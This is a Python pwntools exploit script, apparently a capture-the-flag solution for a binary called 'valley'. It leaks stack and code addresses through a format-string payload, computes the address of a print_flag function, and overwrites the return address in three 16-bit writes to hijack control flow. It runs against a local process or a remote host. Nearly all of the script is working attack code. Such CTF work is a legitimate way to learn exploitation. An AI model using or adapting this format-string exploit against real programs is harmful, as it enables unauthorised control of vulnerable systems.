#!/usr/bin/env python3
from pwn import *

# Configuration
context.log_level = 'debug'
context.arch = 'amd64'  # Change as needed

# Binary and connection settings
BINARY = './valley'  # Replace with actual binary name
#HOST = 'host.example.com'  # Replace with actual host
#PORT = 1234  # Replace with actual port

def get_connection(mode):
    """Get connection based on mode (local/remote)"""
    if mode == 'local':
        return process(BINARY)
    elif mode == 'remote':
        return remote(HOST, PORT)
    else:
        log.error("Mode must be 'local' or 'remote'")
        exit(1)

def exploit(conn):
    payload_1 = b"%20$p::%21$p"
    conn.sendlineafter(b"Shouting: ", payload_1)
    conn.recvuntil(b"You heard in the distance: ")

    response = conn.recv().decode().strip()
    log.info(f"Raw response: {response}")

    addresses = response.split("::")

    print(addresses)

    #calculate return address that points to main_addr
    return_addr_overwrite = int(addresses[0], 16) - 8
    main_addr = int(addresses[1], 16)

    offset = 0x1AA
    print_flag_addr = main_addr - offset
    log.success(f"Calculated print_flag address: {hex(print_flag_addr)}")

    payload_chunk = [
        (print_flag_addr & 0xFFFF),
        ((print_flag_addr >> 16) & 0xFFFF),
        ((print_flag_addr >> 32) & 0xFFFF)
    ]                    

    conn.sendline(fmtstr_payload(6, {return_addr_overwrite: payload_chunk[0]}))
    conn.sendline(fmtstr_payload(6, {return_addr_overwrite + 2: payload_chunk[1]}))
    conn.sendline(fmtstr_payload(6, {return_addr_overwrite + 4: payload_chunk[2]}))

    payload_2 = b"exit\n"
    conn.sendline(payload_2)
    response = conn.recv().strip()
    log.info(f"Raw respones: {response}")

    
def main():
    import sys
    
    if len(sys.argv) != 2:
        log.error("Usage: python exploit.py [local|remote]")
        exit(1)
    
    mode = sys.argv[1]
    
    # Get connection
    conn = get_connection(mode)
    
    # Run exploit
    exploit(conn)
    
    # Clean up
    conn.close()

if __name__ == "__main__":
    main()